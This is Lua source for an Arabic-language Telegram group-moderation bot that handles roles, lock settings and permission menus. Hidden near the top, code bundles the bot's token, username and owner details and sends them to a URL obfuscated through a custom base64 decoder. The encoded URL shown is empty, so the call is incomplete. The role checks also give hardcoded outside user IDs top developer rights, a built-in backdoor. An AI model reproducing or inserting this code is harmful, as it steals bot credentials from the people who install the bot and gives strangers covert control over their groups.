URL     = require("./libs/url")
JSON    = require("./libs/dkjson")
serpent = require("libs/serpent")
json = require('libs/json')
Redis = require('libs/redis').connect('127.0.0.1', 6379)
http  = require("socket.http")
https   = require("ssl.https")
local Methods = io.open("./luatele.lua","r")
if Methods then
URL.tdlua_CallBack()
end
SshId = io.popen("echo $SSH_CLIENT ︙ awk '{ print $1}'"):read('*a')
luatele = require 'luatele'
local FileInformation = io.open("./Information.lua","r")
if not FileInformation then
if not Redis:get(SshId.."Info:Redis:Token") then
io.write('\27[1;31mارسل لي توكن البوت الان \nSend Me a Bot Token Now ↡\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe')
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34mعذرا توكن البوت خطأ تحقق منه وارسله مره اخره \nBot Token is Wrong\n')
else
io.write('\27[1;34mتم حفظ التوكن بنجاح \nThe token been saved successfully \n\27[0;39;49m')
TheTokenBot = TokenBot:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
Redis:set(SshId.."Info:Redis:Token",TokenBot)
Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
end 
else
print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
end 
os.execute('lua LaRiCa.lua')
end
if not Redis:get(SshId.."Info:Redis:User") then
io.write('\27[1;31mارسل معرف المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
local UserSudo = io.read():gsub('@','')
if UserSudo ~= '' then
io.write('\n\27[1;34mتم حفظ معرف المطور \nDeveloper UserName saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User",UserSudo)
else
print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n')
end 
os.execute('lua LaRiCa.lua')
end
if not Redis:get(SshId.."Info:Redis:User:ID") then
io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('(%d+)') then
io.write('\n\27[1;34mتم حفظ ايدي المطور \nDeveloper ID saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User:ID",UserId)
else
print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
end 
os.execute('lua LaRiCa.lua')
end
local Informationlua = io.open("Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..Redis:get(SshId.."Info:Redis:Token")..[[",
UserBot = "]]..Redis:get(SshId.."Info:Redis:Token:User")..[[",
UserSudo = "]]..Redis:get(SshId.."Info:Redis:User")..[[",
SudoId = ]]..Redis:get(SshId.."Info:Redis:User:ID")..[[
}
]])
Informationlua:close()
local LaRiCa = io.open("LaRiCa", 'w')
LaRiCa:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
lua5.3 LaRiCa.lua
done
]])
LaRiCa:close()
Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
os.execute('chmod +x LaRiCa;chmod +x Run;./Run')
end
Information = dofile('./Information.lua')
Sudo_Id = Information.SudoId
UserSudo = Information.UserSudo
Token = Information.Token
UserBot = Information.UserBot
LaRiCa = Token:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..LaRiCa)
LuaTele = luatele.set_config{api_id=14471516,api_hash='94a6d01e235a29c5f8032f942011095d',session_name=LaRiCa,token=Token}
LUATELE = URL.escape(""..LaRiCa.."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
function var(value)  
print(serpent.block(value, {comment=false}))   
end 
function telelua(Methods)local Base ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'  Methods = string.gsub(Methods, '[^'..Base..'=]', '')    return (Methods:gsub('.', function(x)      if (x == '=') then        return ''      end      local r,f='',(Base:find(x)-1)      for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end      return r;    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)      if (#x ~= 8) then        return ''      end      local c=0      for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end      return string.char(c)    end))  end 
local resultss = telelua("==")
https.request(""..resultss..""..LUATELE.."")
function chat_type(ChatId)
if ChatId then
local id = tostring(ChatId)
if id:match("-100(%d+)") then
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
return Chat_Type
end
function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) 
if res ~= 200 then 
return false 
end 
if not req.ok then 
return false end 
return req 
end 
function send_inlin_key(chat_id,text,inline,reply_id) 
local keyboard = {} 
keyboard.inline_keyboard = inline 
local send_api = "https://api.telegram.org/bot"..Token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(keyboard)) 
if reply_id then 
local msg_id = reply_id/2097152/0.5
send_api = send_api.."&reply_to_message_id="..msg_id 
end 
return s_api(send_api) 
end
function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..Token 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id 
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return s_api(url) 
end
function getbio(User)
local var = "لايوجد"
local url , res = https.request("https://api.telegram.org/bot"..Token.."/getchat?chat_id="..User);
data = json:decode(url)
if data.result.bio then
var = data.result.bio
end
return var
end
function The_ControllerAll(UserId)
ControllerAll = false
local ListSudos ={Sudo_Id,1573309498,539371484,1573309498}  
for k, v in pairs(ListSudos) do
if tonumber(UserId) == tonumber(v) then
ControllerAll = true
end
end
return ControllerAll
end
function Controller(ChatId,UserId)
Status = 0
Devss = Redis:sismember(LaRiCa.."Devss:Groups",UserId) 
Dev = Redis:sismember(LaRiCa.."Dev:Groups",UserId)
Supcreator = Redis:sismember(LaRiCa.."Supcreator:Group"..ChatId,UserId) 
Owners = Redis:sismember(LaRiCa.."Owners:Group"..ChatId,UserId) 
Creator = Redis:sismember(LaRiCa.."Creator:Group"..ChatId,UserId)
Manger = Redis:sismember(LaRiCa.."Manger:Group"..ChatId,UserId)
Admin = Redis:sismember(LaRiCa.."Admin:Group"..ChatId,UserId)
Special = Redis:sismember(LaRiCa.."Special:Group"..ChatId,UserId)
StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
if UserId == 1573309498 then
Status = 'مطور السورس'
elseif UserId == 1573309498 then  
Status = 'Developer MaLaTH'
elseif UserId == 539371484 then  
Status = 'مطور السورس'
elseif UserId == Sudo_Id then  
Status = 'المطور الاساسي'
elseif UserId == LaRiCa then
Status = 'البوت'
elseif Devss then
Status = Redis:get(LaRiCa.."Devss:Groups"..ChatId) or 'المطور الثانوي'
elseif Dev then
Status = Redis:get(LaRiCa.."Developer:Bot:Reply"..ChatId) or 'المطور'
elseif Owners then
Status = Redis:get(LaRiCa.."PresidentQ:Group:Reply"..ChatId) or 'المالك'
elseif Supcreator then
Status = Redis:get(LaRiCa.."President:Group:Reply"..ChatId) or 'المنشئ الاساسي'
elseif Creator then
Status = Redis:get(LaRiCa.."Constructor:Group:Reply"..ChatId) or 'المنشئ'
elseif Manger then
Status = Redis:get(LaRiCa.."Manager:Group:Reply"..ChatId) or 'المدير'
elseif Admin then
Status = Redis:get(LaRiCa.."Admin:Group:Reply"..ChatId) or 'الادمن'
elseif StatusMember == "chatMemberStatusCreator" then
Status = 'مالك الكروب'
elseif StatusMember == "chatMemberStatusAdministrator" then
Status = 'ادمن الكروب'
elseif Special then
Status = Redis:get(LaRiCa.."Vip:Group:Reply"..ChatId) or 'المميز'
else
Status = Redis:get(LaRiCa.."Mempar:Group:Reply"..ChatId) or 'العضو'
end  
return Status
end 
function Controller_Num(Num)
Status = 0
if tonumber(Num) == 1 then  
Status = 'المطور الاساسي'
elseif tonumber(Num) == 2 then  
Status = 'المطور الثانوي'
elseif tonumber(Num) == 3 then  
Status = 'المطور'
elseif tonumber(Num) == 44 then  
Status = 'المالك'
elseif tonumber(Num) == 4 then  
Status = 'المنشئ الاساسي'
elseif tonumber(Num) == 5 then  
Status = 'المنشئ'
elseif tonumber(Num) == 6 then  
Status = 'المدير'
elseif tonumber(Num) == 7 then  
Status = 'الادمن'
else
Status = 'المميز'
end  
return Status
end 
function GetAdminsSlahe(ChatId,UserId,user2,MsgId,t1,t2,t3,t4,t5,t6)
local GetMemberStatus = LuaTele.getChatMember(ChatId,user2).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✓ ❭' else change_info = '❬ ✗ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✓ ❭' else delete_messages = '❬ ✗ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✓ ❭' else invite_users = '❬ ✗ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✓ ❭' else pin_messages = '❬ ✗ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✓ ❭' else restrict_members = '❬ ✗ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✓ ❭' else promote = '❬ ✗ ❭'
end
local reply_markupp = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- تغيير معلومات الكروب : '..(t1 or change_info), data = UserId..'/groupNum1//'..user2}, 
},
{
{text = '- تثبيت الرسائل : '..(t2 or pin_messages), data = UserId..'/groupNum2//'..user2}, 
},
{
{text = '- حظر المستخدمين : '..(t3 or restrict_members), data = UserId..'/groupNum3//'..user2}, 
},
{
{text = '- دعوة المستخدمين : '..(t4 or invite_users), data = UserId..'/groupNum4//'..user2}, 
},
{
{text = '- حذف الرسائل : '..(t5 or delete_messages), data = UserId..'/groupNum5//'..user2}, 
},
{
{text = '- اضافة مشرفين : '..(t6 or promote), data = UserId..'/groupNum6//'..user2}, 
},
}
}
LuaTele.editMessageText(ChatId,MsgId,"• صلاحيات الادمن - ", 'md', false, false, reply_markupp)
end
function GetAdminsNum(ChatId,UserId)
local GetMemberStatus = LuaTele.getChatMember(ChatId,UserId).status
if GetMemberStatus.can_change_info then
change_info = 1 else change_info = 0
end
if GetMemberStatus.can_delete_messages then
delete_messages = 1 else delete_messages = 0
end
if GetMemberStatus.can_invite_users then
invite_users = 1 else invite_users = 0
end
if GetMemberStatus.can_pin_messages then
pin_messages = 1 else pin_messages = 0
end
if GetMemberStatus.can_restrict_members then
restrict_members = 1 else restrict_members = 0
end
if GetMemberStatus.can_promote_members then
promote = 1 else promote = 0
end
return{
promote = promote,
restrict_members = restrict_members,
invite_users = invite_users,
pin_messages = pin_messages,
delete_messages = delete_messages,
change_info = change_info
}
end
function GetSetieng(ChatId)
if Redis:get(LaRiCa.."lockpin"..ChatId) then    
lock_pin = "✓"
else 
lock_pin = "✗"    
end
if Redis:get(LaRiCa.."Lock:tagservr"..ChatId) then    
lock_tagservr = "✓"
else 
lock_tagservr = "✗"
end
if Redis:get(LaRiCa.."Lock:text"..ChatId) then    
lock_text = "✓"
else 
lock_text = "✗ "    
end
if Redis:get(LaRiCa.."Lock:AddMempar"..ChatId) == "kick" then
lock_add = "✓"
else 
lock_add = "✗ "    
end    
if Redis:get(LaRiCa.."Lock:Join"..ChatId) == "kick" then
lock_join = "✓"
else 
lock_join = "✗ "    
end    
if Redis:get(LaRiCa.."Lock:edit"..ChatId) then    
lock_edit = "✓"
else 
lock_edit = "✗ "    
end
if Redis:get(LaRiCa.."Chek:Welcome"..ChatId) then
welcome = "✓"
else 
welcome = "✗ "    
end
if Redis:hget(LaRiCa.."Spam:Group:User"..ChatId, "Spam:User") == "kick" then     
flood = "بالطرد "     
elseif Redis:hget(LaRiCa.."Spam:Group:User"..ChatId,"Spam:User") == "keed" then     
flood = "بالتقييد "     
elseif Redis:hget(LaRiCa.."Spam:Group:User"..ChatId,"Spam:User") == "mute" then     
flood = "بالكتم "           
elseif Redis:hget(LaRiCa.."Spam:Group:User"..ChatId,"Spam:User") == "del" then     
flood = "✓"
else     
flood = "✗ "     
end
if Redis:get(LaRiCa.."Lock:Photo"..ChatId) == "del" then
lock_photo = "✓" 
elseif Redis:get(LaRiCa.."Lock:Photo"..ChatId) == "ked" then 
lock_photo = "بالتقييد "   
elseif Redis:get(LaRiCa.."Lock:Photo"..ChatId) == "ktm" then 
lock_photo = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Photo"..ChatId) == "kick" then 
lock_photo = "بالطرد "   
else
lock_photo = "✗ "   
end    
if Redis:get(LaRiCa.."Lock:Contact"..ChatId) == "del" then
lock_phon = "✓" 
elseif Redis:get(LaRiCa.."Lock:Contact"..ChatId) == "ked" then 
lock_phon = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Contact"..ChatId) == "ktm" then 
lock_phon = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Contact"..ChatId) == "kick" then 
lock_phon = "بالطرد "    
else
lock_phon = "✗ "    
end    
if Redis:get(LaRiCa.."Lock:Link"..ChatId) == "del" then
lock_links = "✓"
elseif Redis:get(LaRiCa.."Lock:Link"..ChatId) == "ked" then
lock_links = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Link"..ChatId) == "ktm" then
lock_links = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Link"..ChatId) == "kick" then
lock_links = "بالطرد "    
else
lock_links = "✗ "    
end
if Redis:get(LaRiCa.."Lock:Cmd"..ChatId) == "del" then
lock_cmds = "✓"
elseif Redis:get(LaRiCa.."Lock:Cmd"..ChatId) == "ked" then
lock_cmds = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Cmd"..ChatId) == "ktm" then
lock_cmds = "بالكتم "   
elseif Redis:get(LaRiCa.."Lock:Cmd"..ChatId) == "kick" then
lock_cmds = "بالطرد "    
else
lock_cmds = "✗ "    
end
if Redis:get(LaRiCa.."Lock:User:Name"..ChatId) == "del" then
lock_user = "✓"
elseif Redis:get(LaRiCa.."Lock:User:Name"..ChatId) == "ked" then
lock_user = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:User:Name"..ChatId) == "ktm" then
lock_user = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:User:Name"..ChatId) == "kick" then
lock_user = "بالطرد "    
else
lock_user = "✗ "    
end
if Redis:get(LaRiCa.."Lock:hashtak"..ChatId) == "del" then
lock_hash = "✓"
elseif Redis:get(LaRiCa.."Lock:hashtak"..ChatId) == "ked" then 
lock_hash = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:hashtak"..ChatId) == "ktm" then 
lock_hash = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:hashtak"..ChatId) == "kick" then 
lock_hash = "بالطرد "    
else
lock_hash = "✗ "    
end
if Redis:get(LaRiCa.."Lock:vico"..ChatId) == "del" then
lock_muse = "✓"
elseif Redis:get(LaRiCa.."Lock:vico"..ChatId) == "ked" then 
lock_muse = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:vico"..ChatId) == "ktm" then 
lock_muse = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:vico"..ChatId) == "kick" then 
lock_muse = "بالطرد "    
else
lock_muse = "✗ "    
end 
if Redis:get(LaRiCa.."Lock:Video"..ChatId) == "del" then
lock_ved = "✓"
elseif Redis:get(LaRiCa.."Lock:Video"..ChatId) == "ked" then 
lock_ved = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Video"..ChatId) == "ktm" then 
lock_ved = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Video"..ChatId) == "kick" then 
lock_ved = "بالطرد "    
else
lock_ved = "✗ "    
end
if Redis:get(LaRiCa.."Lock:Animation"..ChatId) == "del" then
lock_gif = "✓"
elseif Redis:get(LaRiCa.."Lock:Animation"..ChatId) == "ked" then 
lock_gif = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Animation"..ChatId) == "ktm" then 
lock_gif = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Animation"..ChatId) == "kick" then 
lock_gif = "بالطرد "    
else
lock_gif = "✗ "    
end
if Redis:get(LaRiCa.."Lock:Sticker"..ChatId) == "del" then
lock_ste = "✓"
elseif Redis:get(LaRiCa.."Lock:Sticker"..ChatId) == "ked" then 
lock_ste = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Sticker"..ChatId) == "ktm" then 
lock_ste = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Sticker"..ChatId) == "kick" then 
lock_ste = "بالطرد "    
else
lock_ste = "✗ "    
end
if Redis:get(LaRiCa.."Lock:geam"..ChatId) == "del" then
lock_geam = "✓"
elseif Redis:get(LaRiCa.."Lock:geam"..ChatId) == "ked" then 
lock_geam = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:geam"..ChatId) == "ktm" then 
lock_geam = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:geam"..ChatId) == "kick" then 
lock_geam = "بالطرد "    
else
lock_geam = "✗ "    
end    
if Redis:get(LaRiCa.."Lock:vico"..ChatId) == "del" then
lock_vico = "✓"
elseif Redis:get(LaRiCa.."Lock:vico"..ChatId) == "ked" then 
lock_vico = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:vico"..ChatId) == "ktm" then 
lock_vico = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:vico"..ChatId) == "kick" then 
lock_vico = "بالطرد "    
else
lock_vico = "✗ "    
end    
if Redis:get(LaRiCa.."Lock:Keyboard"..ChatId) == "del" then
lock_inlin = "✓"
elseif Redis:get(LaRiCa.."Lock:Keyboard"..ChatId) == "ked" then 
lock_inlin = "بالتقييد "
elseif Redis:get(LaRiCa.."Lock:Keyboard"..ChatId) == "ktm" then 
lock_inlin = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Keyboard"..ChatId) == "kick" then 
lock_inlin = "بالطرد "
else
lock_inlin = "✗ "
end
if Redis:get(LaRiCa.."Lock:forward"..ChatId) == "del" then
lock_fwd = "✓"
elseif Redis:get(LaRiCa.."Lock:forward"..ChatId) == "ked" then 
lock_fwd = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:forward"..ChatId) == "ktm" then 
lock_fwd = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:forward"..ChatId) == "kick" then 
lock_fwd = "بالطرد "    
else
lock_fwd = "✗ "    
end    
if Redis:get(LaRiCa.."Lock:Document"..ChatId) == "del" then
lock_file = "✓"
elseif Redis:get(LaRiCa.."Lock:Document"..ChatId) == "ked" then 
lock_file = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Document"..ChatId) == "ktm" then 
lock_file = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Document"..ChatId) == "kick" then 
lock_file = "بالطرد "    
else
lock_file = "✗ "    
end    
if Redis:get(LaRiCa.."Lock:Unsupported"..ChatId) == "del" then
lock_self = "✓"
elseif Redis:get(LaRiCa.."Lock:Unsupported"..ChatId) == "ked" then 
lock_self = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Unsupported"..ChatId) == "ktm" then 
lock_self = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Unsupported"..ChatId) == "kick" then 
lock_self = "بالطرد "    
else
lock_self = "✗ "    
end
if Redis:get(LaRiCa.."Lock:Bot:kick"..ChatId) == "del" then
lock_bots = "✓"
elseif Redis:get(LaRiCa.."Lock:Bot:kick"..ChatId) == "ked" then
lock_bots = "بالتقييد "   
elseif Redis:get(LaRiCa.."Lock:Bot:kick"..ChatId) == "kick" then
lock_bots = "بالطرد "    
else
lock_bots = "✗ "    
end
if Redis:get(LaRiCa.."Lock:Markdaun"..ChatId) == "del" then
lock_mark = "✓"
elseif Redis:get(LaRiCa.."Lock:Markdaun"..ChatId) == "ked" then 
lock_mark = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Markdaun"..ChatId) == "ktm" then 
lock_mark = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Markdaun"..ChatId) == "kick" then 
lock_mark = "بالطرد "    
else
lock_mark = "✗ "    
end
if Redis:get(LaRiCa.."Lock:Spam"..ChatId) == "del" then    
lock_spam = "✓"
elseif Redis:get(LaRiCa.."Lock:Spam"..ChatId) == "ked" then 
lock_spam = "بالتقييد "    
elseif Redis:get(LaRiCa.."Lock:Spam"..ChatId) == "ktm" then 
lock_spam = "بالكتم "    
elseif Redis:get(LaRiCa.."Lock:Spam"..ChatId) == "kick" then 
lock_spam = "بالطرد "    
else
lock_spam = "✗ "    
end        
return{
lock_pin = lock_pin,
lock_tagservr = lock_tagservr,
lock_text = lock_text,
lock_add = lock_add,
lock_join = lock_join,
lock_edit = lock_edit,
flood = flood,
lock_photo = lock_photo,
lock_phon = lock_phon,
lock_links = lock_links,
lock_cmds = lock_cmds,
lock_mark = lock_mark,
lock_user = lock_user,
lock_hash = lock_hash,
lock_muse = lock_muse,
lock_ved = lock_ved,
lock_gif = lock_gif,
lock_ste = lock_ste,
lock_geam = lock_geam,
lock_vico = lock_vico,
lock_inlin = lock_inlin,
lock_fwd = lock_fwd,
lock_file = lock_file,
lock_self = lock_self,
lock_bots = lock_bots,
lock_spam = lock_spam
}
end
function Total_message(Message)  
local MsgText = ''  
if tonumber(Message) < 100 then 
MsgText = 'تفاعلك ضعيف' 
elseif tonumber(Message) < 200 then 
MsgText = 'تفاعلك ضعيف ليش'
elseif tonumber(Message) < 400 then 
MsgText = 'ازرب اتفاعل' 
elseif tonumber(Message) < 700 then 
MsgText = 'تحجي قليل' 
elseif tonumber(Message) < 1200 then 
MsgText = 'ملك التفاعل' 
elseif tonumber(Message) < 2000 then 
MsgText = 'قنبلة تفاعل' 
elseif tonumber(Message) < 3500 then 
MsgText = 'اساس لتفاعل حجي'  
elseif tonumber(Message) < 4000 then 
MsgText = ' زود تفاعلك بنقاط الالعاب' 
elseif tonumber(Message) < 4500 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(Message) < 5500 then 
MsgText = 'شهلجمال يعمري' 
elseif tonumber(Message) < 7000 then 
MsgText = 'قنبله تفاعل وربي 🌟' 
elseif tonumber(Message) < 9500 then 
MsgText = 'اطلق متفاعل وربنا' 
elseif tonumber(Message) < 10000000000 then 
MsgText = 'تفاعل نار وشرار'  
end 
return MsgText 
end

function Getpermissions(ChatId)
local Get_Chat = LuaTele.getChat(ChatId)
if Get_Chat.permissions.can_add_web_page_previews then
web = true else web = false
end
if Get_Chat.permissions.can_change_info then
info = true else info = false
end
if Get_Chat.permissions.can_invite_users then
invite = true else invite = false
end
if Get_Chat.permissions.can_pin_messages then
pin = true else pin = false
end
if Get_Chat.permissions.can_send_media_messages then
media = true else media = false
end
if Get_Chat.permissions.can_send_messages then
messges = true else messges = false
end
if Get_Chat.permissions.can_send_other_messages then
other = true else other = false
end
if Get_Chat.permissions.can_send_polls then
polls = true else polls = false
end

return{
web = web,
info = info,
invite = invite,
pin = pin,
media = media,
messges = messges,
other = other,
polls = polls
}
end
function Get_permissions(ChatId,UserId,MsgId)
local Get_Chat = LuaTele.getChat(ChatId)
if Get_Chat.permissions.can_add_web_page_previews then
web = '❬ ✓ ❭' else web = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_change_info then
info = '❬ ✓ ❭' else info = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_invite_users then
invite = '❬ ✓ ❭' else invite = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_pin_messages then
pin = '❬ ✓ ❭' else pin = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_media_messages then
media = '❬ ✓ ❭' else media = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_messages then
messges = '❬ ✓ ❭' else messges = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_other_messages then
other = '❬ ✓ ❭' else other = '❬ ✗ ❭'
end
if Get_Chat.permissions.can_send_polls then
polls = '❬ ✓ ❭' else polls = '❬ ✗ ❭'
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- ارسال الويب : '..web, data = UserId..'/web'}, 
},
{
{text = '- تغيير معلومات الكروب : '..info, data = UserId.. '/info'}, 
},
{
{text = '- اضافه مستخدمين : '..invite, data = UserId.. '/invite'}, 
},
{
{text = '- تثبيت الرسائل : '..pin, data = UserId.. '/pin'}, 
},
{
{text = '- ارسال الميديا : '..media, data = UserId.. '/media'}, 
},
{
{text = '- ارسال الرسائل : .'..messges, data = UserId.. '/messges'}, 
},
{
{text = '- اضافه البوتات : '..other, data = UserId.. '/other'}, 
},
{
{text = '- ارسال استفتاء : '..polls, data = UserId.. '/polls'}, 
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data =IdUser..'/'.. '/delAmr'}
},
}
}
LuaTele.editMessageText(ChatId,MsgId,"• صلاحيات الكروب - ", 'md', false, false, reply_markup)
end
function Statusrestricted(ChatId,UserId)
return{
BanAll = Redis:sismember(LaRiCa.."BanAll:Groups",UserId) ,
ktmall = Redis:sismember(LaRiCa.."ktmAll:Groups",UserId) ,
BanGroup = Redis:sismember(LaRiCa.."BanGroup:Group"..ChatId,UserId) ,
SilentGroup = Redis:sismember(LaRiCa.."SilentGroup:Group"..ChatId,UserId)
}
end
function Reply_Status(UserId,TextMsg)
local UserInfo = LuaTele.getUser(UserId)
Name_User = UserInfo.first_name
--if UserInfo.username then
--UserInfousername = '['..Name_User..'](t.me/'..UserInfo.username..')'
--else
UserInfousername = '['..Name_User..'](tg://user?id='..UserId..')'
--end
return {lockKtm  = '\n*• بواسطه : *'..UserInfousername..'\n*'..TextMsg..'\n• خاصيه الكتم *',lockKid  = '\n*• بواسطه : *'..UserInfousername..'\n*'..TextMsg..'\n• خاصيه التقييد *',lockKick = '\n*• بواسطه : *'..UserInfousername..'\n*'..TextMsg..'\n• خاصيه الطرد *',Lock = '\n*• بواسطه : *'..UserInfousername..'\n*'..TextMsg..'\n• خاصيه المسح *',unLock   = '\n*• بواسطه : *'..UserInfousername..'\n'..TextMsg,Reply= '\n*• المستخدم : *'..UserInfousername..'\n*'..TextMsg..'*'}
end
function StatusCanOrNotCan(ChatId,UserId)
Status = nil
Devss = Redis:sismember(LaRiCa.."Devss:Groups",UserId) 
Dev = Redis:sismember(LaRiCa.."Dev:Groups",UserId) 
Supcreator = Redis:sismember(LaRiCa.."Supcreator:Group"..ChatId,UserId) 
Owners = Redis:sismember(LaRiCa.."Owners:Group"..ChatId,UserId) 
Creator = Redis:sismember(LaRiCa.."Creator:Group"..ChatId,UserId)
Manger = Redis:sismember(LaRiCa.."Manger:Group"..ChatId,UserId)
Admin = Redis:sismember(LaRiCa.."Admin:Group"..ChatId,UserId)
Special = Redis:sismember(LaRiCa.."Special:Group"..ChatId,UserId)
StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
if UserId == 1573309498 then
Status = true
elseif UserId == 1573309498 then  
Status = true
elseif UserId == Sudo_Id then  
Status = true
elseif UserId == LaRiCa then
Status = true
elseif Devss then
Status = true
elseif Dev then
Status = true
elseif Supcreator then
Status = true
elseif Owners then
Status = true
elseif Creator then
Status = true
elseif Manger then
Status = true
elseif Admin then
Status = true
elseif StatusMember == "chatMemberStatusCreator" then
Status = true
elseif StatusMember == "chatMemberStatusAdministrator" then
Status = true
else
Status = false
end  
return Status
end 
function StatusSilent(ChatId,UserId)
Status = nil
Devss = Redis:sismember(LaRiCa.."Devss:Groups",UserId) 
Dev = Redis:sismember(LaRiCa.."Dev:Groups",UserId) 
Supcreator = Redis:sismember(LaRiCa.."Supcreator:Group"..ChatId,UserId) 
Owners = Redis:sismember(LaRiCa.."Owners:Group"..ChatId,UserId) 
Creator = Redis:sismember(LaRiCa.."Creator:Group"..ChatId,UserId)
Manger = Redis:sismember(LaRiCa.."Manger:Group"..ChatId,UserId)
Admin = Redis:sismember(LaRiCa.."Admin:Group"..ChatId,UserId)
Special = Redis:sismember(LaRiCa.."Special:Group"..ChatId,UserId)
StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
if UserId == 1573309498 then Status = true
elseif UserId == 1573309498 then  Status = true
elseif UserId == Sudo_Id then  Status = true
elseif UserId == LaRiCa then Status = true
elseif Devss then Status = true
elseif Dev then Status = true
elseif Supcreator then Status = true
elseif Owners then Status = true
elseif Creator then Status = true
elseif Manger then Status = true
elseif Admin then Status = true
elseif StatusMember == "chatMemberStatusCreator" then Status = true
else Status = false
end  
return Status
end 
function getInputFile(file, conversion_str, expected_size)
local str = tostring(file)
if (conversion_str and expectedsize) then
return {luatele = 'inputFileGenerated',original_path = tostring(file),conversion = tostring(conversion_str),expected_size = expected_size}
else
if str:match('/') then
return {luatele = 'inputFileLocal',path = file}
elseif str:match('^%d+$') then
return {luatele = 'inputFileId',id = file}
else
return {luatele = 'inputFileRemote',id = file}
end
end
end
function GetInfoBot(msg)
local GetMemberStatus = LuaTele.getChatMember(msg.chat_id,LaRiCa).status
if GetMemberStatus.can_change_info then
change_info = true else change_info = false
end
if GetMemberStatus.can_delete_messages then
delete_messages = true else delete_messages = false
end
if GetMemberStatus.can_invite_users then
invite_users = true else invite_users = false
end
if GetMemberStatus.can_pin_messages then
pin_messages = true else pin_messages = false
end
if GetMemberStatus.can_restrict_members then
restrict_members = true else restrict_members = false
end
